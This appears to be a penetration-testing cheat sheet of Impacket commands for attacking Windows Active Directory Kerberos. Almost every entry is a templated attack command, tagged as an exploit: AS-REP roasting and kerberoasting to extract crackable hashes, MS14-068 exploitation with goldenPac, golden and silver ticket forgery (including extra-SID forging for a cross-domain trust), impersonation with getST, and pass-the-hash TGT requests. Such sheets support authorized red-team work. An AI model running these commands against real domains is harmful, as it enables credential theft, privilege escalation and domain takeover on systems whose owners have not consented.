# Impacket

% impacket, windows, kerberos, 88

## GetNPUsers without password to get TGT (ASREPRoasting)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers <domain>/<user> -no-pass -request -format hashcat
```

## GetNPUsers - attempt to list and get TGTs for those users that have the property ‘Do not require Kerberos preauthentication’ (ASREPRoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetNPUsers -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```

## GetUSERSPN - find Service Principal Names that are associated with a normal user account (kerberoasting)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-GetUserSPNs -request -dc-ip <dc_ip> <domain>/<user>:<password>
```

## MS14-068 - goldenPac
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-goldenPac -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
```

## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
```

## Ticketer - Generate golden ticket with extra SID

```
impacket-ticketer -nthash "<hash>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" "<someusername>"
```

# 1. forge the referral ticket
```
impacket-ticketer -nthash "<hash>" -domain-sid "<domain_SID>" -domain "<domain_FQDN>" -extra-sid "<target_domain_SID-RID>" -spn "krbtgt/<domain_FQDN>" "someusername"
```


## Ticketer - (silver ticket) - generate TGS tickets into ccache format which can be converted further into kirbi.
#plateform/linux #target/local  #cat/ATTACK/EXPLOIT
```
impacket-ticketer -nthash <nthash> -domain-sid <domain_sid> -domain <domain> -spn <SPN> <user>
```

## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
#plateform/linux #target/local  #cat/UTILS
```
impacket-ticketConverter <ccache_ticket_file> <ticket_kirbi_file>
```

## Silver ticket - impersonate user
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
impacket-getST -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```

## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
#plateform/linux #target/remote  #cat/UTILS
```
impacket-getTGT -dc-ip <dc_ip> -hashes <lm_hash>:<nt_hash> <domain>/<user>
```

## GetADUser - gather data about the domain’s users and their corresponding email addresses
#plateform/linux #target/remote  #cat/RECON 
```
impacket-GetADUsers -all <domain>/<user>:<password> -dc-ip <dc_ip>
```
